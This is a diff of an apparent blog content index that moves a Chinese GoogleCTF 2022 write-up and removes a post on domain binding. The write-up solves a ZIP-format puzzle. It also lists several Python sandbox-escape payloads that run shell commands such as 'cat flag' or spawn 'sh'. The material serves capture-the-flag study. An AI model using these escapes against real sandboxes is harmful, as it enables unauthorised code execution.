@@ -1134,285 +1134,6 @@ while True:
       </tags>
   </entry>
   <entry>
-    <title>GoogleCTF2022 Writeup</title>
-    <url>/posts/632988450/</url>
-    <content><![CDATA[<h1 id="APPNOTE-TXT"><a href="#APPNOTE-TXT" class="headerlink" title="APPNOTE.TXT"></a>APPNOTE.TXT</h1><p><em>Every single archive manager unpacks this to a different file...</em></p>
-<p><em><a href="https://storage.googleapis.com/gctf-2022-attachments-project/2551253642bde3066e55c9cc8e9b0b4aa77feadc00c81032da778e6f7c89907135dfc2611fd8617204720dbfadb31429ae11f6ecd202887f4ce99f2f53a3c5e8">Attachment</a></em></p>
-<hr>
-<p>解压下载得到的文件<code>dump.zip</code>,得到<code>hello.txt</code>: <code>There&#39;s more to it than meets the eye...</code></p>
-<p>猜测可能有隐藏文件,用<code>binwalk</code>分析:</p>
-<ul>
-<li>文件名从<code>flag00.zip</code>到<code>flag18.zip</code></li>
-<li>每个文件名出现36次</li>
-</ul>
-<pre><code class="bash">~$ binwalk dump.zip
-
-DECIMAL       HEXADECIMAL     DESCRIPTION
---------------------------------------------------------------------------------
-0             0x0             Zip archive data, v0.0 compressed size: 41, uncompressed size: 41, name: hello.txt
-135           0x87            Zip archive data, v0.0 compressed size: 33, uncompressed size: 33, name: hi.txt
-256           0x100           Zip archive data, v0.0 compressed size: 1, uncompressed size: 1, name: flag00
-345           0x159           Zip archive data, v0.0 compressed size: 1, uncompressed size: 1, name: flag00
-434           0x1B2           Zip archive data, v0.0 compressed size: 1, uncompressed size: 1, name: flag00
-523           0x20B           Zip archive data, v0.0 compressed size: 1, uncompressed size: 1, name: flag00
-612           0x264           Zip archive data, v0.0 compressed size: 1, uncompressed size: 1, name: flag00
-...
-60598         0xECB6          Zip archive data, v0.0 compressed size: 1, uncompressed size: 1, name: flag18
-60687         0xED0F          Zip archive data, v0.0 compressed size: 1, uncompressed size: 1, name: flag18
-60776         0xED68          Zip archive data, v0.0 compressed size: 1, uncompressed size: 1, name: flag18
-60865         0xEDC1          Zip archive data, v0.0 compressed size: 1, uncompressed size: 1, name: flag18
-60954         0xEE1A          Zip archive data, v0.0 compressed size: 1, uncompressed size: 1, name: flag18
-61043         0xEE73          Zip archive data, v0.0 compressed size: 1, uncompressed size: 1, name: flag18
-61572         0xF084          End of Zip archive, footer length: 22
-</code></pre>
-<p>使用<code>strings</code>和<code>hexdump</code>分析,发现:</p>
-<ul>
-<li>包含文件<code>hi.txt</code>: <code>Find a needle in the haystack...</code></li>
-<li>猜测flag的长度为18,每组<code>flagXX</code>表示了flag中的一个字符</li>
-<li>dump出来任意一组<code>flagXX</code>,得到flag的字母表<code>abcdefghijklmnopqrstuvwxyz&#123;CTF0137&#125;_</code></li>
-<li>已知flag格式为<code>CTF&#123;...&#125;</code></li>
-</ul>
-<pre><code class="bash">~$ strings dump.zip
-V~uK)
-hello.txtThere&#39;s more to it than meets the eye...
-V~uK)
-hello.txtPK
-hi.txtFind a needle in the haystack...
-hi.txtPK
-flag00aPK
-flag00PK
-flag00bPK
-flag00PK
-flag00cPK
-flag00PK
-flag00dPK
-flag00PK
-flag00ePK
-......
-flag18PK
-flag181PK
-flag18PK
-flag183PK
-flag18PK
-flag187PK
-flag18PK
-flag18&#125;PK
-flag18PK
-flag18_PK
-flag18PK
-</code></pre>
-<pre><code class="bash">~$ hexdump -C dump.zip | head -n 30
-00000000  50 4b 03 04 00 00 00 00  00 00 00 00 00 00 56 7e  |PK............V~|
-00000010  75 4b 29 00 00 00 29 00  00 00 09 00 00 00 68 65  |uK)...).......he|
-00000020  6c 6c 6f 2e 74 78 74 54  68 65 72 65 27 73 20 6d  |llo.txtThere&#39;s m|
-00000030  6f 72 65 20 74 6f 20 69  74 20 74 68 61 6e 20 6d  |ore to it than m|
-00000040  65 65 74 73 20 74 68 65  20 65 79 65 2e 2e 2e 0a  |eets the eye....|
-00000050  50 4b 01 02 00 00 00 00  00 00 00 00 00 00 00 00  |PK..............|
-00000060  56 7e 75 4b 29 00 00 00  29 00 00 00 09 00 00 00  |V~uK)...).......|
-00000070  fd ef 00 00 00 00 00 00  00 00 00 00 00 00 68 65  |..............he|
-00000080  6c 6c 6f 2e 74 78 74 50  4b 03 04 00 00 00 00 00  |llo.txtPK.......|
-00000090  00 00 00 00 00 9a 15 62  e9 21 00 00 00 21 00 00  |.......b.!...!..|
-000000a0  00 06 00 00 00 68 69 2e  74 78 74 46 69 6e 64 20  |.....hi.txtFind |
-000000b0  61 20 6e 65 65 64 6c 65  20 69 6e 20 74 68 65 20  |a needle in the |
-000000c0  68 61 79 73 74 61 63 6b  2e 2e 2e 0a 50 4b 01 02  |haystack....PK..|
-000000d0  00 00 00 00 00 00 00 00  00 00 00 00 9a 15 62 e9  |..............b.|
-000000e0  21 00 00 00 21 00 00 00  06 00 00 00 84 ef 00 00  |!...!...........|
-000000f0  00 00 00 00 00 00 87 00  00 00 68 69 2e 74 78 74  |..........hi.txt|
-00000100  50 4b 03 04 00 00 00 00  00 00 00 00 00 00 43 be  |PK............C.|
-00000110  b7 e8 01 00 00 00 01 00  00 00 06 00 00 00 66 6c  |..............fl|
-00000120  61 67 30 30 61 50 4b 01  02 00 00 00 00 00 00 00  |ag00aPK.........|
-00000130  00 00 00 00 00 43 be b7  e8 01 00 00 00 01 00 00  |.....C..........|
-00000140  00 06 00 00 00 2b ef 00  00 00 00 00 00 00 00 00  |.....+..........|
-00000150  01 00 00 66 6c 61 67 30  30 50 4b 03 04 00 00 00  |...flag00PK.....|
-00000160  00 00 00 00 00 00 00 f9  ef be 71 01 00 00 00 01  |..........q.....|
-00000170  00 00 00 06 00 00 00 66  6c 61 67 30 30 62 50 4b  |.......flag00bPK|
-00000180  01 02 00 00 00 00 00 00  00 00 00 00 00 00 f9 ef  |................|
-00000190  be 71 01 00 00 00 01 00  00 00 06 00 00 00 d2 ee  |.q..............|
-000001a0  00 00 00 00 00 00 00 00  59 01 00 00 66 6c 61 67  |........Y...flag|
-000001b0  30 30 50 4b 03 04 00 00  00 00 00 00 00 00 00 00  |00PK............|
-000001c0  6f df b9 06 01 00 00 00  01 00 00 00 06 00 00 00  |o...............|
-000001d0  66 6c 61 67 30 30 63 50  4b 01 02 00 00 00 00 00  |flag00cPK.......|
-</code></pre>
-<p>参照ZIP文件格式,按照<code>504B0304</code>、<code>504B0102</code>、<code>504B0506</code>分隔<code>dump.zip</code>的<a href="../../CTF/GoogleCTF2022/Misc/assets/hex.out">十六进制表示形式</a>,分析发现:</p>
-<ul>
-<li><code>hello.txt</code>和<code>hi.txt</code>一共占用256字节</li>
-<li><code>flagXX</code>的文件实体为37字节、目录源数据为52字节</li>
-<li>每组<code>flagXX</code>共占用(37 + 53) * 36字节</li>
-</ul>
-<p><img data-src="/../../CTF/GoogleCTF2022/Misc/images/B04B0506.png" alt="B04B0506"></p>
-<p>发现结尾多了18个目录数据源结束标识,猜测可能以此还原文件,以<code>flag00</code>为例:</p>
-<p>目录源数据的开始位置偏移为<code>0x880A0000</code>,用小端表示为<code>0x00000A88</code>(2696),减去<code>hello.txt</code>和<code>hi.txt</code>的256字节,减去第一个文件实体的37字节,然后除以(37+52)得到27,指向<code>flag00</code>这一组的第27个文件实体(从0开始),即字符C.基于flag的格式以C开头,大胆猜测这就是正确答案.</p>
-<p>剩下的过程与之类似,可以使用脚本简化:</p>
-<pre><code class="python">data = &quot;&quot;&quot;\
-880A0000
-65170000
-42240000
-BB2F0000
-6C380000
-274A0000
-7F520000
-3A640000
-71690000
-377C0000
-587F0000
-F1950000
-3E9D0000
-5EA80000
-88BC0000
-92C50000
-2CD40000
-20DB0000
-3FEE0000
-&quot;&quot;&quot;.split()
-print(len(data))
-
-CHOICES = &#39;abcdefghijklmnopqrstuvwxyz&#123;CTF0137&#125;_&#39;
-ans = list()
-
-def conv(s):
-      # 大端转小端
-    a = [s[2 * i:2 * (i + 1)] for i in range(len(s) // 2)]
-    a.reverse()
-    return &#39;&#39;.join(a)
-
-for i,item in enumerate(data):
-    t = int(conv(item), 16) - 256 - 37
-    tt = t // (37 + 52)
-    ttt = tt - 36 * i
-    ans.append(CHOICES[ttt])
-    print(&#39;&#39;.join(ans))
-</code></pre>
-<p>flag:<code>CTF&#123;p0s7m0d3rn_z1p&#125;</code></p>
-<p>参考</p>
-<ul>
-<li><a href="https://xz.aliyun.com/t/3994">从做CTF题到手撕ZIP</a></li>
-<li><a href="http://lordaeronesz.top/2021/08/29/ZIP%E6%A0%BC%E5%BC%8F%E5%88%86%E6%9E%90/">ZIP格式分析</a></li>
-<li><a href="https://pkware.cachefly.net/webdocs/casestudies/APPNOTE.TXT">.ZIP File Format Specification</a></li>
-</ul>
-<h1 id="TREEBOX"><a href="#TREEBOX" class="headerlink" title="TREEBOX"></a>TREEBOX</h1><p><em>I think I finally got Python sandboxing right.</em></p>
-<p><em><a href="https://storage.googleapis.com/gctf-2022-attachments-project/17f98f8c9c9f8089ab3a35e94de752582253c3784637fe6ef6a561c12b817fcd7acf05a4573bff2cd43247f8e5263200aa29745605ae2719de774160bb21e301">Attachment</a> <code>treebox.2022.ctfcompetition.com 1337</code></em></p>
-<hr>
-<details>
-<summary style="display: list-item;">treebox.py</summary>
-
-<div markdown="1">
-
-<pre><code class="python">#!/usr/bin/python3 -u
-#
-# Flag is in a file called &quot;flag&quot; in cwd.
-#
-# Quote from Dockerfile:
-#   FROM ubuntu:22.04
-#   RUN apt-get update &amp;&amp; apt-get install -y python3
-#
-import ast
-import sys
-import os
-
-def verify_secure(m):
-  for x in ast.walk(m):
-    match type(x):
-      case (ast.Import|ast.ImportFrom|ast.Call):
-        print(f&quot;ERROR: Banned statement &#123;x&#125;&quot;)
-        return False
-  return True
-
-abspath = os.path.abspath(__file__)
-dname = os.path.dirname(abspath)
-os.chdir(dname)
-
-print(&quot;-- Please enter code (last line must contain only --END)&quot;)
-source_code = &quot;&quot;
-while True:
-  line = sys.stdin.readline()
-  if line.startswith(&quot;--END&quot;):
-    break
-  source_code += line
-
-tree = compile(source_code, &quot;input.py&quot;, &#39;exec&#39;, flags=ast.PyCF_ONLY_AST)
-if verify_secure(tree):  # Safe to execute!
-  print(&quot;-- Executing safe code:&quot;)
-  compiled = compile(source_code, &quot;input.py&quot;, &#39;exec&#39;)
-  exec(compiled)
-</code></pre>
-</div>
-</details>
-
-<p>阅读源码,可以发现:</p>
-<ul>
-<li><code>flag</code>在当前工作目录下一个名为<code>flag</code>的文件</li>
-<li>我们可以通过<code>exec</code>执行任意代码,但必须通过<code>verify_secure</code>函数的检查</li>
-<li><code>verify_secure</code>使用<code>ast</code>模块进行分析,不能有显式的函数调用和导入语句</li>
-<li><code>os</code>和<code>sys</code>模块可用</li>
-</ul>
-<p>思路:</p>
-<ul>
-<li><code>os</code>模块已经导入,我们可以通过<code>os.system()</code>方法来执行系统命令</li>
-<li>借助于Python机制,通过非显式的方式地来调用函数,如内置函数、重载运算符、解释器Hook</li>
-</ul>
-<p>我的解法:</p>
-<p>在python中使用<code>in</code>运算符时,默认会调用<code>__contains__</code>方法,并且会将需要判断的对象作为形参传入;</p>
-<p>所以我们可以用<code>os.system</code>覆盖现有的python对象&#x2F;类上的<code>__contains__</code>方法,然后通过运算符来调用<code>system</code>函数.</p>
-<pre><code class="python">os.environ.__class__.__contains__ = os.system
-&#39;cat flag&#39; in os.environ
-</code></pre>
-<p>其他解法:</p>
-<ol>
-<li><p>装饰器</p>
-<pre><code class="python">@exec
-@input
-class X:
-  pass
-</code></pre>
-</li>
-<li><p>异常</p>
-<pre><code class="python">class MyException(Exception):
-  def __str__(self):
-    return &#39;cat flag&#39;
-
-sys.stdout.write=os.system
-sys.stderr.write=os.system
-
-raise MyException   
-</code></pre>
-<pre><code class="python">class X:
-    def __init__(self, a, b, c):
-        self += &quot;os.system(&#39;sh&#39;)&quot;
-    __iadd__ = exec
-sys.excepthook = X
-1/0
-</code></pre>
-</li>
-<li><p>元类</p>
-<pre><code class="python"># This will define the members on the &quot;sub&quot;class
-class Metaclass:
-    __getitem__ = exec # So Sub[string] will execute exec(string)
-# Note: Metaclass.__class__ == type
-    
-class Sub(metaclass=Metaclass): # That&#39;s how we make Sub.__class__ == Metaclass
-    pass # Nothing special to do
-
-assert isinstance(Sub, Metaclass)
-sub[&#39;import os; os.system(&quot;sh&quot;)&#39;]
-</code></pre>
-</li>
-</ol>
-<p>其他Writeup</p>
-<ul>
-<li><a href="https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/">GCTF 2022 Treebox</a></li>
-</ul>
-<p><strong>flag:</strong><code>CTF&#123;CzeresniaTopolaForsycja&#125;</code></p>
-<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>GoogleCTF</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>GoogleCTF</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>GoogleCTF2023 Writeup</title>
     <url>/posts/851556193/</url>
     <content><![CDATA[<h1 id="LEAST-COMMON-GENOMINATOR"><a href="#LEAST-COMMON-GENOMINATOR" class="headerlink" title="LEAST COMMON GENOMINATOR?"></a>LEAST COMMON GENOMINATOR?</h1><p><em>Someone used this program to send me an encrypted message but I can&#39;t read it! It uses something called an LCG, do you know what it is? I dumped the first six consecutive values generated from it but what do I do with it?!</em></p>
@@ -1843,36 +1564,282 @@ def signup_post():
       </tags>
   </entry>
   <entry>
-    <title>Hexo+Github pages博客绑定中文域名</title>
-    <url>/posts/24787/</url>
-    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>近期又开始了hexo的折腾，在阿里云上买了一个属于自己的域名，因此想着把自己用hexo+Github搭建的博客通过域名访问，于是按照百度上的教程一步一步来绑定域名，结果出现了很多问题 。整个过程可谓一波三折，终于实现了通过域名来访问博客，下面简要介绍一下我绑定域名过程中遇到的问题以及解决方案。</p>
-<span id="more"></span>
-<h2 id="购买域名"><a href="#购买域名" class="headerlink" title="购买域名"></a>购买域名</h2><p>这里以在<a href="https://www.aliyun.com/">阿里云</a>上购买域名为例,大家也可以去其他平台购买域名。<br>登录阿里云，点击<strong>产品</strong>，选择<strong>域名注册</strong>。<br>注册域名前需查询域名是否已被注册，选择自己喜欢的域名，支付即可。<br><img data-src="/images/20180213014855.jpg"><br>一般来说，.top与.xyz结尾的域名都比较便宜。为了节约成本，我买的.top结尾的域名，一年只需两块钱，很便宜。</p>
-<h2 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h2><p>购买域名后，我们依次点击个人昵称-&gt;域名与网站(万网)-&gt;域名，进入管理控制台，在这里我们可以看到自己购买的域名,点击<strong>解析</strong>，进入解析设置。<br><img data-src="/images/20180212235815.jpg"><br>点击添加解析，依次输入：<strong>CNAME、@、Github博客地址</strong>，点击<strong>确定</strong>，完成个人域名向个人博客的映射。<br><img data-src="/images/20180212230359.jpg"></p>
-<div class="note warning"><p>注意：这里填入博客地址的时候无需填写https:// ，只需按照example.github.io格式填写就行了。
-</p></div>
+    <title>GoogleCTF2022 Writeup</title>
+    <url>/posts/632988450/</url>
+    <content><![CDATA[<h1 id="APPNOTE-TXT"><a href="#APPNOTE-TXT" class="headerlink" title="APPNOTE.TXT"></a>APPNOTE.TXT</h1><p><em>Every single archive manager unpacks this to a different file...</em></p>
+<p><em><a href="https://storage.googleapis.com/gctf-2022-attachments-project/2551253642bde3066e55c9cc8e9b0b4aa77feadc00c81032da778e6f7c89907135dfc2611fd8617204720dbfadb31429ae11f6ecd202887f4ce99f2f53a3c5e8">Attachment</a></em></p>
+<hr>
+<p>解压下载得到的文件<code>dump.zip</code>,得到<code>hello.txt</code>: <code>There&#39;s more to it than meets the eye...</code></p>
+<p>猜测可能有隐藏文件,用<code>binwalk</code>分析:</p>
+<ul>
+<li>文件名从<code>flag00.zip</code>到<code>flag18.zip</code></li>
+<li>每个文件名出现36次</li>
+</ul>
+<pre><code class="bash">~$ binwalk dump.zip
 
-<h2 id="创建CNAME文件"><a href="#创建CNAME文件" class="headerlink" title="创建CNAME文件"></a>创建CNAME文件</h2><p>在本地的根目录下的source文件夹中新建一个名为<strong>CNAME</strong>的文本文件，文件内容为<strong>个人域名</strong>（没有http:&#x2F;&#x2F; ,也没有www.）,然后重命名删除该文件的后缀名:<strong>.txt</strong>。<br>使用<code>hexo d -g</code>命令部署博客，这时在浏览器中输入新注册的域名，已经可以正常的访问博客了。</p>
-<h3 id="英文域名"><a href="#英文域名" class="headerlink" title="英文域名"></a>英文域名</h3><p>英文域名就直接写:<code>example.con</code></p>
-<h3 id="中文域名"><a href="#中文域名" class="headerlink" title="中文域名"></a>中文域名</h3><p>中文域名的话,则需先将中文域名转换为<strong>Punycode标准编码的字符串</strong>:<a href="http://www.dh.vg/tools/zm.php">中文域名转换Punycode标准编码工具</a><br>For example:<br><code>例子.中文</code>经过转换为<code>xn--fsqu00a.xn--fiq228c</code><br>将<code>xn--****.xn--***</code>填入<strong>CNAME</strong>文件即可。</p>
-<div class="note danger"><p>如果直接在CNAME文件中填写中文域名,则Github会通过邮件提醒你:
-The CNAME xxx.com is not properly formatted. See https://help.github.com/articles/troubleshooting-custom-domains/#github-repository-setup-errors for more information.
-</p></div>
-## LeanCloud数据丢失
-通过域名访问博客，发现文章的阅读次数不显示，于是各种折腾：检查元素、谷歌，最后发现是由于没有将新注册的域名加入到LeanCloud设置中的**Web 安全域名**,导致无法调用服务器资源。
-解决方案：访问：[LeanCloud官网](https://leancloud.cn),进入**控制台**，在设置中点击**安全中心**，将新注册的域名加入到**Web安全域名**中，点击**保存**即可。
-![](/images/20180213013700.jpg)
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Zip archive data, v0.0 compressed size: 41, uncompressed size: 41, name: hello.txt
+135           0x87            Zip archive data, v0.0 compressed size: 33, uncompressed size: 33, name: hi.txt
+256           0x100           Zip archive data, v0.0 compressed size: 1, uncompressed size: 1, name: flag00
+345           0x159           Zip archive data, v0.0 compressed size: 1, uncompressed size: 1, name: flag00
+434           0x1B2           Zip archive data, v0.0 compressed size: 1, uncompressed size: 1, name: flag00
+523           0x20B           Zip archive data, v0.0 compressed size: 1, uncompressed size: 1, name: flag00
+612           0x264           Zip archive data, v0.0 compressed size: 1, uncompressed size: 1, name: flag00
+...
+60598         0xECB6          Zip archive data, v0.0 compressed size: 1, uncompressed size: 1, name: flag18
+60687         0xED0F          Zip archive data, v0.0 compressed size: 1, uncompressed size: 1, name: flag18
+60776         0xED68          Zip archive data, v0.0 compressed size: 1, uncompressed size: 1, name: flag18
+60865         0xEDC1          Zip archive data, v0.0 compressed size: 1, uncompressed size: 1, name: flag18
+60954         0xEE1A          Zip archive data, v0.0 compressed size: 1, uncompressed size: 1, name: flag18
+61043         0xEE73          Zip archive data, v0.0 compressed size: 1, uncompressed size: 1, name: flag18
+61572         0xF084          End of Zip archive, footer length: 22
+</code></pre>
+<p>使用<code>strings</code>和<code>hexdump</code>分析,发现:</p>
+<ul>
+<li>包含文件<code>hi.txt</code>: <code>Find a needle in the haystack...</code></li>
+<li>猜测flag的长度为18,每组<code>flagXX</code>表示了flag中的一个字符</li>
+<li>dump出来任意一组<code>flagXX</code>,得到flag的字母表<code>abcdefghijklmnopqrstuvwxyz&#123;CTF0137&#125;_</code></li>
+<li>已知flag格式为<code>CTF&#123;...&#125;</code></li>
+</ul>
+<pre><code class="bash">~$ strings dump.zip
+V~uK)
+hello.txtThere&#39;s more to it than meets the eye...
+V~uK)
+hello.txtPK
+hi.txtFind a needle in the haystack...
+hi.txtPK
+flag00aPK
+flag00PK
+flag00bPK
+flag00PK
+flag00cPK
+flag00PK
+flag00dPK
+flag00PK
+flag00ePK
+......
+flag18PK
+flag181PK
+flag18PK
+flag183PK
+flag18PK
+flag187PK
+flag18PK
+flag18&#125;PK
+flag18PK
+flag18_PK
+flag18PK
+</code></pre>
+<pre><code class="bash">~$ hexdump -C dump.zip | head -n 30
+00000000  50 4b 03 04 00 00 00 00  00 00 00 00 00 00 56 7e  |PK............V~|
+00000010  75 4b 29 00 00 00 29 00  00 00 09 00 00 00 68 65  |uK)...).......he|
+00000020  6c 6c 6f 2e 74 78 74 54  68 65 72 65 27 73 20 6d  |llo.txtThere&#39;s m|
+00000030  6f 72 65 20 74 6f 20 69  74 20 74 68 61 6e 20 6d  |ore to it than m|
+00000040  65 65 74 73 20 74 68 65  20 65 79 65 2e 2e 2e 0a  |eets the eye....|
+00000050  50 4b 01 02 00 00 00 00  00 00 00 00 00 00 00 00  |PK..............|
+00000060  56 7e 75 4b 29 00 00 00  29 00 00 00 09 00 00 00  |V~uK)...).......|
+00000070  fd ef 00 00 00 00 00 00  00 00 00 00 00 00 68 65  |..............he|
+00000080  6c 6c 6f 2e 74 78 74 50  4b 03 04 00 00 00 00 00  |llo.txtPK.......|
+00000090  00 00 00 00 00 9a 15 62  e9 21 00 00 00 21 00 00  |.......b.!...!..|
+000000a0  00 06 00 00 00 68 69 2e  74 78 74 46 69 6e 64 20  |.....hi.txtFind |
+000000b0  61 20 6e 65 65 64 6c 65  20 69 6e 20 74 68 65 20  |a needle in the |
+000000c0  68 61 79 73 74 61 63 6b  2e 2e 2e 0a 50 4b 01 02  |haystack....PK..|
+000000d0  00 00 00 00 00 00 00 00  00 00 00 00 9a 15 62 e9  |..............b.|
+000000e0  21 00 00 00 21 00 00 00  06 00 00 00 84 ef 00 00  |!...!...........|
+000000f0  00 00 00 00 00 00 87 00  00 00 68 69 2e 74 78 74  |..........hi.txt|
+00000100  50 4b 03 04 00 00 00 00  00 00 00 00 00 00 43 be  |PK............C.|
+00000110  b7 e8 01 00 00 00 01 00  00 00 06 00 00 00 66 6c  |..............fl|
+00000120  61 67 30 30 61 50 4b 01  02 00 00 00 00 00 00 00  |ag00aPK.........|
+00000130  00 00 00 00 00 43 be b7  e8 01 00 00 00 01 00 00  |.....C..........|
+00000140  00 06 00 00 00 2b ef 00  00 00 00 00 00 00 00 00  |.....+..........|
+00000150  01 00 00 66 6c 61 67 30  30 50 4b 03 04 00 00 00  |...flag00PK.....|
+00000160  00 00 00 00 00 00 00 f9  ef be 71 01 00 00 00 01  |..........q.....|
+00000170  00 00 00 06 00 00 00 66  6c 61 67 30 30 62 50 4b  |.......flag00bPK|
+00000180  01 02 00 00 00 00 00 00  00 00 00 00 00 00 f9 ef  |................|
+00000190  be 71 01 00 00 00 01 00  00 00 06 00 00 00 d2 ee  |.q..............|
+000001a0  00 00 00 00 00 00 00 00  59 01 00 00 66 6c 61 67  |........Y...flag|
+000001b0  30 30 50 4b 03 04 00 00  00 00 00 00 00 00 00 00  |00PK............|
+000001c0  6f df b9 06 01 00 00 00  01 00 00 00 06 00 00 00  |o...............|
+000001d0  66 6c 61 67 30 30 63 50  4b 01 02 00 00 00 00 00  |flag00cPK.......|
+</code></pre>
+<p>参照ZIP文件格式,按照<code>504B0304</code>、<code>504B0102</code>、<code>504B0506</code>分隔<code>dump.zip</code>的<a href="../../CTF/GoogleCTF2022/Misc/assets/hex.out">十六进制表示形式</a>,分析发现:</p>
+<ul>
+<li><code>hello.txt</code>和<code>hi.txt</code>一共占用256字节</li>
+<li><code>flagXX</code>的文件实体为37字节、目录源数据为52字节</li>
+<li>每组<code>flagXX</code>共占用(37 + 53) * 36字节</li>
+</ul>
+<p><img data-src="/../../CTF/GoogleCTF2022/Misc/images/B04B0506.png" alt="B04B0506"></p>
+<p>发现结尾多了18个目录数据源结束标识,猜测可能以此还原文件,以<code>flag00</code>为例:</p>
+<p>目录源数据的开始位置偏移为<code>0x880A0000</code>,用小端表示为<code>0x00000A88</code>(2696),减去<code>hello.txt</code>和<code>hi.txt</code>的256字节,减去第一个文件实体的37字节,然后除以(37+52)得到27,指向<code>flag00</code>这一组的第27个文件实体(从0开始),即字符C.基于flag的格式以C开头,大胆猜测这就是正确答案.</p>
+<p>剩下的过程与之类似,可以使用脚本简化:</p>
+<pre><code class="python">data = &quot;&quot;&quot;\
+880A0000
+65170000
+42240000
+BB2F0000
+6C380000
+274A0000
+7F520000
+3A640000
+71690000
+377C0000
+587F0000
+F1950000
+3E9D0000
+5EA80000
+88BC0000
+92C50000
+2CD40000
+20DB0000
+3FEE0000
+&quot;&quot;&quot;.split()
+print(len(data))
 
-<h2 id="busuanzi数据丢失"><a href="#busuanzi数据丢失" class="headerlink" title="busuanzi数据丢失"></a>busuanzi数据丢失</h2><p>无论是通过域名还是github地址访问博客，博客底部的统计浏览量与浏览人次均不是以前的数据，而是从头开始计算....<br>busuanzi还不具备统初始值的功能，只能从头开始计算了。。。</p>
-<h2 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h2><h3 id="中文域名-1"><a href="#中文域名-1" class="headerlink" title="中文域名"></a>中文域名</h3><p>１、一类是域名后缀为英文字母的国际中文域名和别国中文域名，比如：中文.com，中文.net，中文.biz，中文.cc，中文.hk，中文.tm，中文.tv，中文.tw；<br>２、一类是域名后缀为中文的纯中文国内中文域名，比如：中文域名.中国，中文域名.公司，中文域名.网络；<br>中文域名在解析的时候，需要先转换为 xn--fiq228c.com或xn--fiq228c.cn形式的ASCII码，这种编码称为PunyCode。纯中文域名不被标准的解析服务器支持，要实现对这种纯中文域名的正确访问，ISP需要做相应的修改，以便能够正确解析中文域名。同时CNNIC也提供了专用服务器，用户只要将浏览器的DNS设置指向这台服务器，它同样可以完成对纯中文域名的正确解析。另外，考虑到现在有些ISP还没有做修改，而有些用户又不方便将DNS设置指向CNNIC提供的服务器，纯中文域名会被加上.cn后缀，即对每一个纯中文域名同时有两种形式：纯中文域名和纯中文域名.CN， 如：&quot;中文域名.网络&quot;和&quot;中文域名.网络.CN&quot;。这样即使ISP还没有做相应的修改，用户也可以正确使用中文域名。</p>
-<h3 id="PunyCode"><a href="#PunyCode" class="headerlink" title="PunyCode"></a>PunyCode</h3><p>英文域名在IIS或Apache中的虚拟主机设置，可以直接使用英文域名，如webmasterhome.cn。<br>中文域名在IIS或Apache中应如何设置主机头呢？如&quot;中国站长之家.com&quot;。<br>1、在进行设置之前要先把中文域名转化成为PunyCode编码，然后在主机头设置里面填上中文域名所对应的PunyCode编码(｀xn--fiqsC146Ah4ex80Cro7A.com｀)便可。<br>新的国际化域名的标准在网域名称编码上，为了保留向下兼容性及不影响现有的应用程序协议，因此将多国语言域名转成ASCII编码，而这种编码称为『punycode』。<br>因为经过Nameprep处理过的国际化域名是以 Unicode 序列的形式表示的。但现有的 DNS系统只支持用 ASCII字符表示的域名，所以要对Unicode序列进行 ACE(ASCII-compatible encoding)编码，把 Unicode序列表示的域名转换成 ASCII 字符串表示的ACE域名。<br>2、PunyCode是一种专为国际化域名而设计的高效ACE编码方式。它可以在Unicode序列和ASCII 字符串之间进行唯一的和可逆的转换。转换的过程中，Unicode 序列中的ASCII字符保持不变，国际化字符则用字母和数字来表示。它的实质是一种用数量有限的基本字符(字母和数字)来唯一地表示大字符集(Unicode)中的字符的通用算法。域名中的字符，包括 ASCII 码和 Unicode 码，都是作为整数进行处理。<br>PunyCode则是将一个经过Nameprep处理过的IDN，从一个8位的编码的形式转换为7位编码的形式。目前Internet DNS一向是7位ASCII编码的环境，经过这个PunyCode转码程序，便将IDN从一个8位的IDN转换为与现有DNS环境兼容的编码。<br>3、在DNS服务器方面，需要将IDN以PunyCode的编码形式来设定。因为PunyCode本身就是一种7位的编码，与ASCII编码完全兼容，所以可适用设定于目前所有可用的DNS版本,也就是说可以不需要为了设定PunyCode而重新安装BIND新版本。但是若是需要使用DNAME指令来设定资源记录(Resource Record)，则需先提升为BIND9的版本。</p>
+CHOICES = &#39;abcdefghijklmnopqrstuvwxyz&#123;CTF0137&#125;_&#39;
+ans = list()
+
+def conv(s):
+      # 大端转小端
+    a = [s[2 * i:2 * (i + 1)] for i in range(len(s) // 2)]
+    a.reverse()
+    return &#39;&#39;.join(a)
+
+for i,item in enumerate(data):
+    t = int(conv(item), 16) - 256 - 37
+    tt = t // (37 + 52)
+    ttt = tt - 36 * i
+    ans.append(CHOICES[ttt])
+    print(&#39;&#39;.join(ans))
+</code></pre>
+<p>flag:<code>CTF&#123;p0s7m0d3rn_z1p&#125;</code></p>
+<p>参考</p>
+<ul>
+<li><a href="https://xz.aliyun.com/t/3994">从做CTF题到手撕ZIP</a></li>
+<li><a href="http://lordaeronesz.top/2021/08/29/ZIP%E6%A0%BC%E5%BC%8F%E5%88%86%E6%9E%90/">ZIP格式分析</a></li>
+<li><a href="https://pkware.cachefly.net/webdocs/casestudies/APPNOTE.TXT">.ZIP File Format Specification</a></li>
+</ul>
+<h1 id="TREEBOX"><a href="#TREEBOX" class="headerlink" title="TREEBOX"></a>TREEBOX</h1><p><em>I think I finally got Python sandboxing right.</em></p>
+<p><em><a href="https://storage.googleapis.com/gctf-2022-attachments-project/17f98f8c9c9f8089ab3a35e94de752582253c3784637fe6ef6a561c12b817fcd7acf05a4573bff2cd43247f8e5263200aa29745605ae2719de774160bb21e301">Attachment</a> <code>treebox.2022.ctfcompetition.com 1337</code></em></p>
+<hr>
+<details>
+<summary style="display: list-item;">treebox.py</summary>
+
+<div markdown="1">
+
+<pre><code class="python">#!/usr/bin/python3 -u
+#
+# Flag is in a file called &quot;flag&quot; in cwd.
+#
+# Quote from Dockerfile:
+#   FROM ubuntu:22.04
+#   RUN apt-get update &amp;&amp; apt-get install -y python3
+#
+import ast
+import sys
+import os
+
+def verify_secure(m):
+  for x in ast.walk(m):
+    match type(x):
+      case (ast.Import|ast.ImportFrom|ast.Call):
+        print(f&quot;ERROR: Banned statement &#123;x&#125;&quot;)
+        return False
+  return True
+
